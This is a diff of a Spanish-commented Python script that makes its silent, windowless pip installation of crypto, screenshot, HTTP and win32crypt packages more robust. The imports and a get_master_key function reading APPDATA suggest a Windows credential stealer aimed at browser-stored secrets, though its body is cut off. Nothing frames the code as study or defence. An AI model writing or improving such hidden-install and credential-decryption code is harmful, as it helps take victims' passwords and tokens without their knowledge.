@@ -1,34 +1,32 @@
 import subprocess
 import sys
+import importlib
 
-def instalar_dependencias():
-    paquetes = {
-        "Crypto": "pycryptodome",
-        "requests": "requests",
-        "PIL": "pillow",
-        "pyautogui": "pyautogui",
-        "win32crypt": "pywin32"
-    }
-    
-    for modulo, paquete in paquetes.items():
+def asegurar_paquete(modulo, paquete):
+    try:
+        return importlib.import_module(modulo)
+    except ImportError:
         try:
-            __import__(modulo)
-        except ImportError:
-            try:
-                # Usar el lanzador oficial 'py' de Windows para invocar pip de forma segura
-                subprocess.run(
-                    ["py", "-m", "pip", "install", paquete],
-                    stdout=subprocess.DEVNULL,
-                    stderr=subprocess.DEVNULL,
-                    creationflags=subprocess.CREATE_NO_WINDOW
-                )
-            except Exception:
-                pass
+            subprocess.run(
+                ["py", "-m", "pip", "install", paquete],
+                stdout=subprocess.DEVNULL,
+                stderr=subprocess.DEVNULL,
+                creationflags=subprocess.CREATE_NO_WINDOW
+            )
+            return importlib.import_module(modulo)
+        except Exception:
+            return None
 
-# Ejecutar la verificación antes de los imports
-instalar_dependencias()
+# Asegurar e importar cada dependencia de forma segura antes de usarlas
+AES = asegurar_paquete("Crypto.Cipher", "pycryptodome") # o importar el submódulo necesario
+# Si prefieres asegurarlos todos al inicio sin que den error de sintaxis global:
+asegurar_paquete("Crypto", "pycryptodome")
+asegurar_paquete("requests", "requests")
+asegurar_paquete("PIL", "pillow")
+asegurar_paquete("pyautogui", "pyautogui")
+asegurar_paquete("win32crypt", "pywin32")
 
-# Tus imports normales a partir de aquí:
+# Ahora sí, tus imports normales ya funcionarán porque ya están instalados:
 from Crypto.Cipher import AES
 import base64
 import io
@@ -46,7 +44,6 @@ import win32crypt
 import pyautogui
 from PIL import Image
 import requests
-
 
 def get_master_key():
   appdata = os.getenv("APPDATA")
